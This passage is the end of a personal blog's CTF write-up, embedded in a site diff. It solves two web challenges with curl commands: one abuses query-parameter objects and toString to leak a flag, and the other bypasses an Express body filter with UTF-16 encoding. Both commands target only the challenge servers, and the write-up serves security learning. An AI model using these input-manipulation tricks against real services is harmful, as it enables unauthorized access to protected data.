+</span></span></code></pre></div><blockquote>
+<p><strong>Solution</strong></p>
+<p><strong>cURL command:</strong> curl &lsquo;<a href="http://challenges.gynvael.stream:5002/?X[length]=801&amp;X[toString]=1%27" target="_blank" rel="noopener noreferrer">http://challenges.gynvael.stream:5002/?X[length]=801&X[toString]=1'</a>
+</p>
+<p><strong>Explanation</strong></p>
+<p>Here the param X can be an object by sending get param as X[key]=value and this leads to prototype pollution. To satisfy the given conditions, we have to set X[length] &gt; 800 and X[toString] property to some value. Because in JS while concatenating an object with a string, the toString method is called and if we change it&rsquo;s value, it raises an error and gives the flag!</p></blockquote>
+<hr>
+<h2 id="challenge-4">Challenge 4</h2>
+<p><strong>Challenge URL:</strong> <a href="http://challenges.gynvael.stream:5004/" target="_blank" rel="noopener noreferrer">http://challenges.gynvael.stream:5004/</a>
+<br>
+<strong>Source code:</strong> <a href="files/chall4.js">source.js</a>
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;path&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">PORT</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">5004</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">FLAG</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">FLAG</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;???&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">SOURCE</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">basename</span>(<span style="color:#a6e22e">__filename</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">text</span>({
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">verify</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">body</span>) =&gt; {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">magic</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#e6db74">&#39;ShowMeTheFlag&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#a6e22e">magic</span>)) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">&#34;Go away.&#34;</span>)
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/flag&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">statusCode</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#39;Content-Type&#39;</span>, <span style="color:#e6db74">&#39;text/plain;charset=utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>) <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;What?&#34;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;ShowMeTheFlag&#39;</span>)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">FLAG</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;Say the magic phrase!&#34;</span>)
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">statusCode</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#39;Content-Type&#39;</span>, <span style="color:#e6db74">&#39;text/plain;charset=utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#34;Level 4\n\n&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">SOURCE</span>)
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">PORT</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Challenge listening at port </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">PORT</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>)
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><blockquote>
+<p><strong>Solution</strong></p>
+<p><strong>cURL command:</strong> echo -e &ldquo;\x00S\x00h\x00o\x00w\x00M\x00e\x00T\x00h\x00e\x00F\x00l\x00a\x00g&rdquo; | curl -XPOST &lsquo;<a href="http://challenges.gynvael.stream:5004/flag%27" target="_blank" rel="noopener noreferrer">http://challenges.gynvael.stream:5004/flag'</a>
+ &ndash;data-binary @- -H &lsquo;Content-Type: text/plain;charset=UTF-16&rsquo;</p>
+<p><strong>Explanation</strong></p>
+<p>First things first, points to note:</p>
+<ol>
+<li>Using express.text to parse the request body.</li>
+<li>typeof req.body should be string.</li>
+</ol>
+<p>I googled about the express.text and landed on <a href="https://expressjs.com/en/api.html#express.text" target="_blank" rel="noopener noreferrer">this</a>
+ page. So as mentioned in that page, the express.text triggers only when the content-type is text/plain (or other text types). And also this makes sense, because if we send content-type as text/plain, the typeof req.body will be a string, as mentioned in the 2nd point. Now the only difference between body send to express.text and req.body is, the raw data of request is used in express.text and parsed data (if encoded) is given to req.body. Now we can send the required data (ShowMeTheFlag) encoded as UTF-16 and specifying it in the content-type header and we get the flag!</p></blockquote>
+<p>I am not able to solve the other 2 challs. For their solutions refer to this <a href="https://oshogbo.vexillium.org/" target="_blank" rel="noopener noreferrer">link</a>
+.</p>
+<hr>
+<h5 align="center" id="thanks-for-reading">Thanks for reading!</h5></div><hr /><div class="post-navs d-flex mb-3 justify-content-evenly">
+  <div class="post-nav post-prev"><i class="fas fa-fw fa-chevron-left"></i>
+    <a href="http://localhost:1313/en/about/">About
+</a>
+  </div><div class="post-nav post-next">
+    <a href="http://localhost:1313/en/posts/allesctf2020/">AllesCTF 2020 Writeup [Only Freights]
+</a>
+    <i class="fas fa-fw fa-chevron-right"></i>
+  </div></div><section class="related-posts-wrapper">
+    <h3>Related Posts</h3>
+    <ul class="related-posts"><li><a href="http://localhost:1313/en/about/">About
+</a></li></ul>
+  </section></div>
+    </article></div>
+</div><aside class="col-lg-4 sidebar d-flex">
+  <div class="container">
+    
+    <section class="card row text-center profile component">
+  <div class="card-body">
+    <div class="col-12 d-flex align-items-center justify-content-center"><img class="profile-avatar rounded-circle" alt="Akash Gurugunti" src="http://localhost:1313/images/me.jpg" loading="lazy"
+  
+   />
+</div>
+    <div class="col-12 profile-meta"><div class="profile-name">Akash Gurugunti</div><div class="profile-bio">Cyber Security, Blockchain</div><div class="profile-company"><i class="fas fa-fw fa-building"></i> OtterSec LLC</div><br /><div class="profile-location"><i class="fas fa-fw fa-map-marker-alt"></i> <a href='https://goo.gl/maps/FAU9GUmrdMSmuBBG8' target='_blank'>Hyderabad, India</a></div><br /><div class="profile-about"><i class="fas fa-fw fa-user"></i><a href="http://localhost:1313/en/about/"> About Me</a></div><br /></div>
+  </div>
+</section>
+  <section class="featured-posts row card component">
+    <div class="card-body">
+      <h2 class="card-title">Featured Posts</h2>
+      <ul><li><a href="http://localhost:1313/en/posts/ethernaut-challenges/">Ethernaut Challenges Writeup
+</a></li></ul>
+    </div>
+  </section><section class="recent-posts row card component">
+  <div class="card-body">
+    <h2 class="card-title">Recent Posts</h2>
+    <ul><li><a href="http://localhost:1313/en/posts/ethernaut-challenges/">Ethernaut Challenges Writeup
+</a></li><li><a href="http://localhost:1313/en/posts/dragonctf2021/">DragonCTF 2021 Writeup
+</a></li><li><a href="http://localhost:1313/en/posts/kernelctf2021/">KernelCTF 2021 Writeups
+</a></li><li><a href="http://localhost:1313/en/posts/tokyowesternsctf2020/">TokyoWesterns CTF 2020 Writeup [Urlcheck V1&amp;V2]
+</a></li><li><a href="http://localhost:1313/en/posts/allesctf2020/">AllesCTF 2020 Writeup [Only Freights]
+</a></li></ul>
+  </div>
+</section><section class="taxonomies row card component">
+      <div class="card-body">
+        <h2 class="card-title">
+          <a href="http://localhost:1313/en/categories">Categories</a>
+        </h2>
+        <div><a href="http://localhost:1313/en/categories/ctf/" class="badge bg-primary text-white rounded post-taxonomy" title="Ctf">
+            Ctf
+          </a><a href="http://localhost:1313/en/categories/twitter-challenge/" class="badge bg-primary text-white rounded post-taxonomy" title="Twitter Challenge">
+            Twitter Challenge
+          </a></div>
+      </div>
+    </section><section class="taxonomies row card component">
+      <div class="card-body">
+        <h2 class="card-title">
+          <a href="http://localhost:1313/en/tags">Tags</a>
+        </h2>
+        <div><a href="http://localhost:1313/en/tags/writeups/" class="badge bg-primary text-white rounded post-taxonomy" title="Writeups">
+            Writeups
+          </a><a href="http://localhost:1313/en/tags/ctfs/" class="badge bg-primary text-white rounded post-taxonomy" title="Ctfs">
+            Ctfs
+          </a><a href="http://localhost:1313/en/tags/web/" class="badge bg-primary text-white rounded post-taxonomy" title="Web">
+            Web
+          </a><a href="http://localhost:1313/en/tags/blockchain/" class="badge bg-primary text-white rounded post-taxonomy" title="Blockchain">
+            Blockchain
+          </a><a href="http://localhost:1313/en/tags/challenge/" class="badge bg-primary text-white rounded post-taxonomy" title="Challenge">
+            Challenge
+          </a><a href="http://localhost:1313/en/tags/ethereum/" class="badge bg-primary text-white rounded post-taxonomy" title="Ethereum">
+            Ethereum
+          </a><a href="http://localhost:1313/en/tags/evm/" class="badge bg-primary text-white rounded post-taxonomy" title="Evm">
+            Evm
+          </a><a href="http://localhost:1313/en/tags/misc/" class="badge bg-primary text-white rounded post-taxonomy" title="Misc">
+            Misc
+          </a><a href="http://localhost:1313/en/tags/twitter/" class="badge bg-primary text-white rounded post-taxonomy" title="Twitter">
+            Twitter
+          </a></div>
+      </div>
+    </section>
+    
+  </div>
+</aside>
+</div>
+    </main><footer class="footer mt-auto py-3 text-center container"><nav class="social-links nav my-2 justify-content-center"></nav>
+<div class="copyright mb-2">
+  Copyright © 2018-2025 Akash Gurugunti. All Rights Reserved.
+</div>
+</footer>
+<script src="http://localhost:1313/js/bundle.min.c99ccec30e35b24fea35d63b3b2168d0cad943a0dc22a99e7567111424c8608d.js" integrity="sha256-yZzOww41sk/qNdY7OyFo0MrZQ6DcIqmedWcRFCTIYI0=" crossorigin="anonymous" defer></script><script defer src="http://localhost:1313/js/viewer.min.116cccec7db7ce374835844bc02e425669b3ce679c12c9d7d4770f0956022bad.js" integrity="sha256-EWzM7H23zjdINYRLwC5CVmmzzmecEsnX1HcPCVYCK60=" crossorigin="anonymous"></script><script defer src="http://localhost:1313/js/katex.min.eebc778ed32c63652f7c9fc84c2ac3adf593d26fed4352f5245ec510c725ef1b.js" integrity="sha256-7rx3jtMsY2UvfJ/ITCrDrfWT0m/tQ1L1JF7FEMcl7xs=" crossorigin="anonymous"></script>
+</body>
+</html>
